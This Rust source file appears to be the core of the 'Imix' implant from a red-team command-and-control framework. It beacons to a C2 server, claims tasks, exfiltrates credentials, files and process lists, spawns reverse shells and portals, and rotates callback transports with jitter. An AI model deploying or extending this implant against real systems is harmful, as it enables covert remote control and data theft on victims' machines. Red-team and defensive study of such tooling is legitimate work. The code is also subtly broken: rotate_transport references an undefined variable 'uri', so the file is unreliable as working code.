use anyhow::{Context as AnyhowContext, Result};
use eldritch::agent::agent::Agent;
use eldritch_agent::Context;
use pb::c2::host::Platform;
use pb::c2::transport::Type;
use pb::c2::{
    self, ClaimTasksRequest, ReportOutputRequest, ReportShellTaskOutputMessage,
    ReportTaskOutputMessage, ShellTaskContext, ShellTaskOutput, TaskContext, TaskOutput,
    report_output_request,
};
use pb::config::Config;
use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::RwLock;
use transport::Transport;

use crate::portal::run_create_portal;
use crate::shell::manager::{ShellManager, ShellManagerMessage};
use crate::task::TaskRegistry;

const MAX_BUF_OUTPUT_MESSAGES: usize = 100;

pub type PendingForward = (
    String,
    tokio::sync::mpsc::Receiver<Vec<u8>>,
    tokio::sync::mpsc::Sender<Vec<u8>>,
);

#[derive(Clone)]
pub struct ImixAgent {
    config: Arc<RwLock<Config>>,
    transport: Arc<RwLock<Box<dyn Transport + Send + Sync>>>,
    runtime_handle: tokio::runtime::Handle,
    pub task_registry: Arc<TaskRegistry>,
    pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
    pub output_tx: std::sync::mpsc::SyncSender<c2::ReportOutputRequest>,
    pub output_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportOutputRequest>>>,
    pub process_list_tx: std::sync::mpsc::SyncSender<c2::ReportProcessListRequest>,
    pub process_list_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportProcessListRequest>>>,
    pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
    pub pending_forwards: Arc<tokio::sync::Mutex<Vec<PendingForward>>>,
}

impl ImixAgent {
    pub fn new(
        config: Config,
        runtime_handle: tokio::runtime::Handle,
        task_registry: Arc<TaskRegistry>,
        shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
    ) -> Self {
        let (output_tx, output_rx) = std::sync::mpsc::sync_channel(MAX_BUF_OUTPUT_MESSAGES);
        let (process_list_tx, process_list_rx) = std::sync::mpsc::sync_channel(64);

        Self {
            config: Arc::new(RwLock::new(config)),
            transport: Arc::new(RwLock::new(transport::init_transport())),
            runtime_handle,
            task_registry,
            subtasks: Arc::new(Mutex::new(BTreeMap::new())),
            output_tx,
            output_rx: Arc::new(Mutex::new(output_rx)),
            process_list_tx,
            process_list_rx: Arc::new(Mutex::new(process_list_rx)),
            shell_manager_tx,
            pending_forwards: Arc::new(tokio::sync::Mutex::new(Vec::new())),
        }
    }

    pub fn start_shell_manager(self: Arc<Self>, manager: ShellManager) {
        self.runtime_handle.spawn(manager.run());
    }

    pub fn get_callback_interval_u64(&self) -> Result<u64> {
        // Blocks on read, but it's fast
        let cfg = self
            .config
            .try_read()
            .map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
        let info = cfg
            .info
            .as_ref()
            .context("Configuration has no agent information")?;
        let interval = info
            .callback_interval
            .as_ref()
            .context("Configuration has no callback interval")?;
        Ok(interval.seconds as u64)
    }

    pub fn get_callback_interval(&self) -> Result<Duration> {
        let seconds = self.get_callback_interval_u64()?;
        Ok(Duration::from_secs(seconds))
    }

    pub fn get_tasks_to_execute(&self) -> Result<Vec<c2::Task>> {
        let mut tasks = Vec::new();
        while let Some(task) = self.task_registry.get_next_queued_task() {
            tasks.push(task);
        }
        Ok(tasks)
    }

    pub fn cancel_task(&self, task_id: i64) -> Result<()> {
        self.task_registry.cancel_task(task_id);

        if let Ok(mut subtasks) = self.subtasks.lock() {
            if let Some(handle) = subtasks.remove(&task_id) {
                handle.abort();
            }
        }

        Ok(())
    }

    pub fn cancel_all_tasks(&self) -> Result<()> {
        self.task_registry.cancel_all_tasks();

        if let Ok(mut subtasks) = self.subtasks.lock() {
            for (_task_id, handle) in subtasks.drain() {
                handle.abort();
            }
        }

        Ok(())
    }

    pub async fn update_config(&self, new_config: Config) -> Result<()> {
        let mut cfg = self.config.write().await;
        *cfg = new_config;
        Ok(())
    }

    pub async fn update_transport(&self, new_transport: Box<dyn Transport + Send + Sync>) {
        let mut transport = self.transport.write().await;
        *transport = new_transport;
    }

    pub async fn claim_tasks(&self) -> Result<Option<c2::ClaimTasksResponse>> {
        let mut transport = self.get_usable_transport().await?;
        let req = self.build_claim_tasks_request().await?;
        let resp = transport.claim_tasks(req).await?;
        Ok(Some(resp))
    }

    pub async fn report_output(&self, msg: ReportOutputRequest) -> Result<()> {
        let mut transport = self.get_usable_transport().await?;
        transport.report_output(msg).await?;
        Ok(())
    }

    pub async fn build_claim_tasks_request(&self) -> Result<ClaimTasksRequest> {
        let cfg = self.config.read().await;
        let info = cfg
            .info
            .as_ref()
            .context("Configuration has no agent information")?;

        let hostname = match hostname::get() {
            Ok(name) => name.to_string_lossy().into_owned(),
            Err(_) => "".to_string(),
        };

        let agent_identity = pb::c2::Agent {
            id: info.agent_id.clone(),
            host: Some(pb::c2::Host {
                id: info.host_id.clone(),
                platform: Platform::from(cfg.target_os).into(),
                name: hostname,
            }),
            name: info.name.clone(),
            registered_at: None,
        };

        let tasks: Vec<c2::TaskContext> = self
            .task_registry
            .tasks
            .lock()
            .unwrap()
            .iter()
            .map(|(id, t)| c2::TaskContext {
                task_id: *id,
                status: t.status.into(),
            })
            .collect();

        let req = c2::ClaimTasksRequest {
            agent: Some(agent_identity),
            tasks,
        };

        Ok(req)
    }

    pub async fn forward_raw(
        &self,
        path: String,
        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
    ) -> Result<()> {
        let mut transport = self.get_usable_transport().await?;
        transport.forward_raw(path, rx, tx).await?;
        Ok(())
    }

    pub async fn get_usable_transport(&self) -> Result<Box<dyn Transport + Send + Sync>> {
        let transport = self.transport.read().await;
        transport.get_usable_transport().await
    }

    pub async fn drain_report_output_requests(
        &self,
    ) -> Result<BTreeMap<TaskContext, Vec<TaskOutput>>> {
        let mut reqs = BTreeMap::new();
        let rx = self.output_rx.lock().unwrap();

        while let Ok(req) = rx.try_recv() {
            let msg = match req.message {
                Some(report_output_request::Message::TaskOutput(msg)) => msg,
                Some(report_output_request::Message::ShellTaskOutput(msg)) => {
                    self.shell_manager_tx
                        .send(ShellManagerMessage::Output(msg))
                        .await?;
                    continue;
                }
                None => continue,
            };

            let ctx = match msg.context {
                Some(ctx) => ctx,
                None => continue,
            };

            let output = match msg.output {
                Some(output) => output,
                None => continue,
            };

            reqs.entry(ctx).or_insert_with(Vec::new).push(output);
        }

        Ok(reqs)
    }

    pub async fn drain_process_list_requests(&self) -> Result<Vec<c2::ReportProcessListRequest>> {
        let mut reqs = Vec::new();
        let rx = self.process_list_rx.lock().unwrap();

        while let Ok(req) = rx.try_recv() {
            reqs.push(req);
        }

        Ok(reqs)
    }

    pub async fn process_job_response(&self, resp: c2::ClaimTasksResponse) -> Result<()> {
        let agent: Arc<dyn Agent> = Arc::new(self.clone());
        for task in resp.tasks {
            match task.task {
                Some(c2::task::Task::Eldritch(tome)) => {
                    self.task_registry.spawn(tome, agent.clone());
                }
                Some(c2::task::Task::Portal(portal)) => {
                    let agent = self.clone();
                    self.runtime_handle
                        .spawn(async move { run_create_portal(agent, portal).await });
                }
                None => {
                    #[cfg(feature = "print_debug")]
                    log::error!("Received unknown task type from server");
                }
            }
        }

        for task_id in resp.cancel_tasks {
            if let Err(_e) = self.cancel_task(task_id) {
                #[cfg(feature = "print_debug")]
                log::error!("Failed to cancel task {}: {_e:#}", task_id);
            }
        }

        Ok(())
    }

    pub async fn process_job_request(&self) -> Result<()> {
        // Dispatch any pending forward_raw requests before checking in.
        // Each forward is spawned so the beacon cycle is not blocked by long-running
        // streaming calls (e.g. ReportFile).
        let pending: Vec<_> = {
            let mut forwards = self.pending_forwards.lock().await;
            forwards.drain(..).collect()
        };
        for (path, rx, tx) in pending {
            let agent = self.clone();
            self.runtime_handle.spawn(async move {
                if let Ok(mut t) = agent.get_usable_transport().await {
                    if let Err(_e) = t.forward_raw(path.clone(), rx, tx).await {
                        #[cfg(feature = "print_debug")]
                        log::error!("Deferred forward_raw to {} failed: {}", path, _e);
                    }
                } else {
                    #[cfg(feature = "print_debug")]
                    log::error!(
                        "Failed to get transport for deferred forward_raw to {}",
                        path
                    );
                }
            });
        }

        // Drain any output and report it
        let reqs = self.drain_report_output_requests().await?;
        let process_list_reqs = self.drain_process_list_requests().await?;

        let mut transport = self.get_usable_transport().await?;

        for (ctx, output) in reqs {
            let msg = c2::ReportTaskOutputMessage {
                context: Some(ctx),
                output,
            };

            let req = c2::ReportOutputRequest {
                message: Some(report_output_request::Message::TaskOutput(msg)),
            };

            if let Err(_e) = transport.report_output(req).await {
                #[cfg(feature = "print_debug")]
                log::error!("Failed to report output: {_e:#}");
            }
        }

        // Only report the latest process list
        if let Some(req) = process_list_reqs.into_iter().last()
            && let Err(_e) = transport.report_process_list(req).await
        {
            #[cfg(feature = "print_debug")]
            log::error!("Failed to report process list: {_e:#}");
        }

        // Try and claim tasks
        let req = self.build_claim_tasks_request().await?;
        let resp = transport.claim_tasks(req).await?;

        // Handle beacon-provided config update:
        // Update the transport fallback pool based on available transports from server
        let mut cfg = self.config.write().await;
        if let Some(info) = cfg.info.as_mut()
            && let Some(available_transports) = info.available_transports.as_mut()
        {
            // Collect the set of URIs present in the server's update
            let server_uris: BTreeSet<String> = resp
                .transports
                .iter()
                .map(|t| t.callback_uri.clone())
                .collect();

            // Retain only those transports whose URI is still in the server's update
            available_transports
                .transports
                .retain(|t| server_uris.contains(&t.uri));

            // Upsert each transport from the server
            for server_t in resp.transports {
                let transport_type = match server_t.r#type() {
                    pb::c2::transport::Type::Grpc => pb::config::transport::Type::Grpc,
                    pb::c2::transport::Type::Http1 => pb::config::transport::Type::Http1,
                    pb::c2::transport::Type::Http2 => pb::config::transport::Type::Http2,
                    pb::c2::transport::Type::Dns => pb::config::transport::Type::Dns,
                    pb::c2::transport::Type::Quic => pb::config::transport::Type::Quic,
                    pb::c2::transport::Type::Icmp => pb::config::transport::Type::Icmp,
                    pb::c2::transport::Type::TcpBind => pb::config::transport::Type::TcpBind,
                    pb::c2::transport::Type::NamedPipeBind => {
                        pb::config::transport::Type::NamedPipeBind
                    }
                };

                let new_transport = pb::config::Transport {
                    uri: server_t.callback_uri.clone(),
                    interval: server_t.callback_interval.unwrap_or_default().seconds as u64,
                    r#type: transport_type as i32,
                    extra: server_t.extra.clone(),
                };

                if let Some(existing) = available_transports
                    .transports
                    .iter_mut()
                    .find(|t| t.uri == server_t.callback_uri)
                {
                    *existing = new_transport;
                } else {
                    available_transports.transports.push(new_transport);
                }
            }

            // Sync the updated transports with the active transport pool
            let mut active_transport = self.transport.write().await;
            active_transport.sync_transports(available_transports.clone())?;
        }

        // Process any returned tasks
        self.process_job_response(resp).await?;

        Ok(())
    }

    // Helper to run a future on the runtime handle, blocking the current thread.
    fn block_on<F, R>(&self, future: F) -> Result<R, String>
    where
        F: std::future::Future<Output = Result<R, String>>,
    {
        self.runtime_handle.block_on(future)
    }

    // Helper to execute an async action with a usable transport, handling setup and errors.
    fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String>
    where
        F: FnOnce(Box<dyn Transport + Send + Sync>) -> Fut,
        Fut: std::future::Future<Output = Result<R, anyhow::Error>>,
    {
        self.block_on(async {
            let t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            action(t).await.map_err(|e| e.to_string())
        })
    }

    // Helper to spawn a background subtask (like a reverse shell)
    fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String>
    where
        F: FnOnce(Box<dyn Transport + Send + Sync>) -> Fut + Send + 'static,
        Fut: std::future::Future<Output = Result<()>> + Send + 'static,
    {
        let subtasks = self.subtasks.clone();
        let agent = self.clone();

        let handle = self.runtime_handle.spawn(async move {
            // We need a transport for the subtask. Get it asynchronously.
            match agent.get_usable_transport().await {
                Ok(transport) => {
                    if let Err(_e) = action(transport).await {
                        #[cfg(feature = "print_debug")]
                        log::error!("Subtask {} error: {_e:#}", task_id);
                    }
                }
                Err(_e) => {
                    #[cfg(feature = "print_debug")]
                    log::error!("Subtask {} failed to get transport: {_e:#}", task_id);
                }
            }
        });

        if let Ok(mut map) = subtasks.lock() {
            map.insert(task_id, handle);
        }

        Ok(())
    }
}

// Implement the Eldritch Agent Trait
#[async_trait::async_trait]
impl Agent for ImixAgent {
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
        // Transport uses std::sync::mpsc::Sender for fetch_asset
        let (tx, rx) = std::sync::mpsc::channel();
        self.with_transport(|mut t| async move { t.fetch_asset(req, tx).await })?;

        let mut data = Vec::new();
        while let Ok(resp) = rx.recv() {
            data.extend(resp.chunk);
        }
        Ok(data)
    }

    fn report_credential(
        &self,
        req: c2::ReportCredentialRequest,
    ) -> Result<c2::ReportCredentialResponse, String> {
        self.with_transport(|mut t| async move { t.report_credential(req).await })
    }

    fn report_file(
        &self,
        req: std::sync::mpsc::Receiver<c2::ReportFileRequest>,
    ) -> Result<c2::ReportFileResponse, String> {
        self.with_transport(|mut t| async move { t.report_file(req).await })
    }

    fn report_process_list(
        &self,
        req: c2::ReportProcessListRequest,
    ) -> Result<c2::ReportProcessListResponse, String> {
        // Convert to an async channel and pass through to agent's report_process_list
        let _ = self.process_list_tx.send(req);

        Ok(c2::ReportProcessListResponse {})
    }

    fn report_task_output(
        &self,
        req: std::sync::mpsc::Receiver<c2::ReportTaskOutputMessage>,
    ) -> Result<c2::ReportOutputResponse, String> {
        // Collect messages from the sync channel and queue them in output_tx.
        // The beacon loop drains output_tx, batches by TaskContext, and sends them.
        while let Ok(msg) = req.recv() {
            let req = c2::ReportOutputRequest {
                message: Some(report_output_request::Message::TaskOutput(msg)),
            };

            let _ = self.output_tx.send(req);
        }

        Ok(c2::ReportOutputResponse {})
    }

    fn report_shell_task_output(
        &self,
        req: std::sync::mpsc::Receiver<c2::ReportShellTaskOutputMessage>,
    ) -> Result<c2::ReportOutputResponse, String> {
        while let Ok(msg) = req.recv() {
            let req = c2::ReportOutputRequest {
                message: Some(report_output_request::Message::ShellTaskOutput(msg)),
            };

            let _ = self.output_tx.send(req);
        }

        Ok(c2::ReportOutputResponse {})
    }

    fn spawn_shell(&self, id: i64) -> Result<(), String> {
        self.spawn_subtask(id, move |transport| async move {
            crate::shell::run_shell(id, transport).await
        })
    }

    fn claim_tasks(&self, req: ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
        self.with_transport(|mut t| async move { t.claim_tasks(req).await })
    }

    async fn forward_raw(
        &self,
        path: String,
        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
    ) -> Result<(), String> {
        let mut pending = self.pending_forwards.lock().await;
        pending.push((path, rx, tx));
        Ok(())
    }

    fn get_config(&self) -> Result<Config, String> {
        self.runtime_handle
            .block_on(async { Ok(self.config.read().await.clone()) })
    }

    fn get_agent_name(&self) -> Result<String, String> {
        let cfg = self.get_config()?;
        let info = cfg
            .info
            .as_ref()
            .ok_or_else(|| "Configuration has no agent information".to_string())?;
        Ok(info.name.clone())
    }

    fn get_host_id(&self) -> Result<String, String> {
        let cfg = self.get_config()?;
        let info = cfg
            .info
            .as_ref()
            .ok_or_else(|| "Configuration has no agent information".to_string())?;
        Ok(info.host_id.clone())
    }

    fn get_agent_id(&self) -> Result<String, String> {
        let cfg = self.get_config()?;
        let info = cfg
            .info
            .as_ref()
            .ok_or_else(|| "Configuration has no agent information".to_string())?;
        Ok(info.agent_id.clone())
    }

    fn get_callback_interval(&self) -> Result<u64, String> {
        self.get_callback_interval_u64()
            .map_err(|e| format!("Failed to get callback interval: {}", e))
    }

    fn get_target_os(&self) -> Result<Platform, String> {
        let cfg = self.get_config()?;
        Ok(Platform::from(cfg.target_os))
    }

    fn get_current_transport(&self) -> Result<String, String> {
        self.block_on(async {
            let t = self
                .get_usable_transport()
                .await
                .map_err(|e| format!("Failed to get usable transport: {}", e))?;
            t.get_current_transport()
                .await
                .map_err(|e| format!("Failed to get current transport: {}", e))
        })
    }

    fn set_callback_interval(&self, seconds: u64) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            let info = cfg
                .info
                .as_mut()
                .ok_or_else(|| "Configuration has no agent information".to_string())?;
            info.callback_interval = Some(pb::google::protobuf::Duration {
                seconds: seconds as i64,
                nanos: 0,
            });
            Ok(())
        })
    }

    fn set_jitter(&self, jitter: f64) -> Result<(), String> {
        if !(0.0..=1.0).contains(&jitter) {
            return Err("Jitter must be between 0.0 and 1.0".to_string());
        }

        self.block_on(async {
            let mut cfg = self.config.write().await;
            let info = cfg
                .info
                .as_mut()
                .ok_or_else(|| "Configuration has no agent information".to_string())?;
            info.jitter = jitter;
            Ok(())
        })
    }

    fn list_available_transports(&self) -> Result<Vec<String>, String> {
        self.block_on(async { Ok(self.transport.read().await.list_available()) })
    }

    fn set_transport_priority(&self, uris: Vec<String>) -> Result<(), String> {
        // First validate that all provided URIs exist in available transports
        let available_transports = self.list_available_transports()?;
        for uri in &uris {
            if !available_transports.contains(uri) {
                return Err(format!("Transport URI '{}' is not available", uri));
            }
        }

        self.block_on(async {
            // Update config if it exists
            {
                let mut cfg = self.config.write().await;
                if let Some(info) = &mut cfg.info
                    && let Some(available_transports) = &mut info.available_transports
                {
                    // Reorder transports based on the provided URI list
                    let mut reordered = Vec::new();
                    for uri in &uris {
                        if let Some(transport) = available_transports
                            .transports
                            .iter()
                            .find(|t| &t.uri == uri)
                        {
                            reordered.push(transport.clone());
                        }
                    }
                    available_transports.transports = reordered;
                }
            }

            // Update active transport pool priority
            let mut active_transport = self.transport.write().await;
            active_transport.set_priority(&uris)?;
            Ok(())
        })
    }

    fn add_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            // Parse the new URI to handle DSN format with fallback transport types
            let parsed_transport = pb::config::parse_dsn(&uri)
                .map_err(|e| format!("Failed to parse callback URI: {}", e))?;

            // Update configuration
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut()
                && let Some(available_transports) = info.available_transports.as_mut()
            {
                // Check if transport already exists
                if !available_transports
                    .transports
                    .iter()
                    .any(|t| t.uri == uri)
                {
                    available_transports.transports.push(parsed_transport);
                }
            }

            // Add to active transport pool using sync_transports to ensure proper fallback configuration
            if let Some(info) = cfg.info.as_ref()
                && let Some(available_transports) = info.available_transports.as_ref()
            {
                let mut active_transport = self.transport.write().await;
                active_transport.sync_transports(available_transports.clone())?;
            }

            Ok(())
        })
    }

    fn get_callback_uris(&self) -> Result<Vec<String>, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            if let Some(info) = cfg.info.as_ref()
                && let Some(available_transports) = info.available_transports.as_ref()
            {
                Ok(available_transports
                    .transports
                    .iter()
                    .map(|t| t.uri.clone())
                    .collect())
            } else {
                Ok(Vec::new())
            }
        })
    }

    fn get_current_callback_uri(&self) -> Result<String, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            if let Some(info) = cfg.info.as_ref()
                && let Some(current_transport) = info.current_transport.as_ref()
            {
                Ok(current_transport.uri.clone())
            } else {
                Err("No current transport set in configuration".to_string())
            }
        })
    }

    fn get_jitter(&self) -> Result<f64, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            if let Some(info) = cfg.info.as_ref() {
                Ok(info.jitter)
            } else {
                Err("Configuration has no agent information".to_string())
            }
        })
    }

    fn remove_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut()
                && let Some(available_transports) = info.available_transports.as_mut()
            {
                // Find and remove the transport with matching URI
                if let Some(pos) = available_transports
                    .transports
                    .iter()
                    .position(|t| t.uri == uri)
                {
                    available_transports.transports.remove(pos);

                    // Sync the updated transports with active transport pool
                    let mut active_transport = self.transport.write().await;
                    active_transport.sync_transports(available_transports.clone())?;
                    Ok(())
                } else {
                    Err(format!("Transport URI '{}' not found", uri))
                }
            } else {
                Err("Configuration has no available transports".to_string())
            }
        })
    }

    fn rotate_transport(&self) -> Result<String, String> {
        // First check if we have multiple transports available
        let available_transports = self.list_available_transports()?;
        if available_transports.len() <= 1 {
            return Err("Cannot rotate: only one or zero transports available".to_string());
        }

        self.block_on(async {
            let mut active_transport = self.transport.write().await;

            // Rotate the active transport
            let new_transport_name = active_transport
                .rotate_transport()
                .await
                .map_err(|e| format!("Failed to rotate transport: {}", e))?;

            // Update configuration with new priority and current transport
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut()
                && let Some(available_transports) = info.available_transports.as_mut()
            {
                // Find the transport matching the new active transport
                if let Some(pos) = available_transports
                    .transports
                    .iter()
                    .position(|t| t.uri == uri)
                {
                    // Move the new transport to the front of the list
                    let transport = available_transports.transports.remove(pos);
                    available_transports.transports.insert(0, transport.clone());
                    info.current_transport = Some(transport);
                }
            }

            Ok(new_transport_name)
        })
    }
}
